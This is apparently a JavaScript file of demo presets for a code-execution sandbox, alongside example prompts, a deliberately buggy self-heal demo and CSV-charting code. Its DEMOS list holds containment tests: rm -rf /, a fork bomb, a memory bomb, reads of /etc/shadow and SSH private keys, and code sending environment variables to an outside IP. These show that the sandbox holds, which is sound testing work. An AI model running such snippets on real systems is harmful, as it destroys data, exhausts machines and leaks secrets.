export const DEMOS = [
  { id: 'rmrf', title: 'rm -rf /', task: 'Containment demo: try to delete the whole filesystem with rm -rf /', language: 'bash', code: 'echo "Attempting rm -rf / ..."\nrm -rf / 2>&1 | head -5\ntouch /var/tmp/safecode-root-probe 2>&1\necho "still alive: $(ls /usr | head -3 | tr \'\\n\' \' \')"', explanation: 'Tries to wipe the root filesystem. The pinned image uses BusyBox rm, which rejects --no-preserve-root, so the probe touches a rootfs path instead.' },
  { id: 'fork', title: 'Fork bomb', task: 'Containment demo: launch a fork bomb', language: 'python', code: 'import os\nn = 0\ntry:\n    while True:\n        pid = os.fork()\n        if pid == 0:\n            import time; time.sleep(3); os._exit(0)\n        n += 1\nexcept OSError as e:\n    print(f"fork bomb stopped after {n} children: {e}")', explanation: 'Spawns processes until the pid limit stops it.' },
  { id: 'loop', title: 'while True', task: 'Containment demo: run an infinite loop forever', language: 'python', code: 'print("spinning forever...", flush=True)\nwhile True:\n    pass', explanation: 'Never terminates on its own.' },
  { id: 'exfil', title: 'curl exfil', task: 'Containment demo: exfiltrate environment variables to an external server', language: 'python', code: 'import os, json, socket\npayload = json.dumps(dict(os.environ)).encode()\nprint("env visible in sandbox:", list(os.environ))\ntry:\n    socket.create_connection(("93.184.216.34", 80), timeout=2).sendall(payload)\n    print("exfiltrated!")\nexcept OSError as e:\n    print(type(e).__name__, e)', explanation: 'Tries to send env vars to a numeric address. Name lookup is not used: with --network none it can block until the wall-clock timeout.' },
  { id: 'shadow', title: 'read /etc/shadow', task: 'Containment demo: read the host password file /etc/shadow', language: 'python', code: 'for f in ["/etc/shadow", "/etc/passwd", "/root/.ssh/id_rsa"]:\n    try:\n        print(f, "->", open(f).read()[:80])\n    except Exception as e:\n        print(f, "->", type(e).__name__, e)', explanation: 'Tries to read host secrets.' },
  { id: 'mem', title: 'Memory bomb', task: 'Containment demo: allocate 4 GB of memory', language: 'python', code: 'chunks = []\ntry:\n    for i in range(128):\n        buf = bytearray(32 * 1024 * 1024)\n        buf[-1] = 1\n        chunks.append(buf)\n        print(f"allocated {(i + 1) * 32} MB", flush=True)\nexcept MemoryError:\n    print("MemoryError", flush=True)', explanation: 'Allocates and faults memory until the cap stops it.' },
];
export const EXAMPLES = [
  'Compute the first 20 prime numbers and their sum',
  'Generate a CSV of 10 fake sales rows, then print total revenue per region',
  'Check whether "A man, a plan, a canal: Panama" is a palindrome and explain',
  'Simulate 10,000 dice rolls and print a text histogram',
];
// Self-heal demo: deliberately buggy preset so the fix-and-rerun loop is reproducible on camera.
// The FIX is produced by the live model (Vultr Serverless Inference); `fixed` is only used by the offline mock.
export const HEAL_DEMO = {
  id: 'heal', title: 'Buggy code (self-heal)', task: 'Self-heal demo: compute the average order value per region from these orders',
  language: 'python', explanation: 'Contains two real bugs (a typo in a key and integer/string mixing) so the first run fails.',
  code: 'orders = [\n    {"region": "north", "value": "120"},\n    {"region": "south", "value": "80"},\n    {"region": "north", "value": "200"},\n]\ntotals = {}\nfor o in orders:\n    totals.setdefault(o["regoin"], []).append(o["value"])\nfor region, vals in totals.items():\n    print(region, sum(vals) / len(vals))',
  fixed: 'orders = [\n    {"region": "north", "value": "120"},\n    {"region": "south", "value": "80"},\n    {"region": "north", "value": "200"},\n]\ntotals = {}\nfor o in orders:\n    totals.setdefault(o["region"], []).append(float(o["value"]))\nfor region, vals in totals.items():\n    print(region, sum(vals) / len(vals))',
};
// Offline-mock CSV analysis (stdlib only): group by first text column, sum first numeric column, draw an SVG bar chart.
export const MOCK_CSV_CODE = (file) => `import csv, json, html
rows = list(csv.DictReader(open("/work/input/${file}", newline="")))
cols = list(rows[0].keys())
def num(v):
    try: return float(v)
    except: return None
ncol = next(c for c in cols if all(num(r[c]) is not None for r in rows))
gcol = next((c for c in cols if c != ncol and any(num(r[c]) is None for r in rows)), None)
agg = {}
for r in rows:
    agg[r[gcol] if gcol else "all"] = agg.get(r[gcol] if gcol else "all", 0) + num(r[ncol])
W, H, bw = 520, 300, 520 // max(1, len(agg))
mx = max(agg.values()) or 1
bars = "".join(f'<rect x="{i*bw+8}" y="{H-30-(v/mx)*(H-60)}" width="{bw-16}" height="{(v/mx)*(H-60)}" fill="#4f8cff"/><text x="{i*bw+bw/2}" y="{H-12}" font-size="12" text-anchor="middle">{html.escape(k)}</text><text x="{i*bw+bw/2}" y="{H-36-(v/mx)*(H-60)}" font-size="11" text-anchor="middle">{v:g}</text>' for i, (k, v) in enumerate(agg.items()))
open("/work/out/chart.svg", "w").write(f'<svg xmlns="http://www.w3.org/2000/svg" width="{W}" height="{H}" font-family="sans-serif"><rect width="100%" height="100%" fill="white"/>{bars}</svg>')
print(f"{ncol} by {gcol}: rows={len(rows)}")
for k, v in agg.items(): print(f"  {k}: {v:g}")
print("RESULTS_JSON=" + json.dumps({"rows": len(rows), "metric": ncol, "group_by": gcol, "totals": agg}))
`;
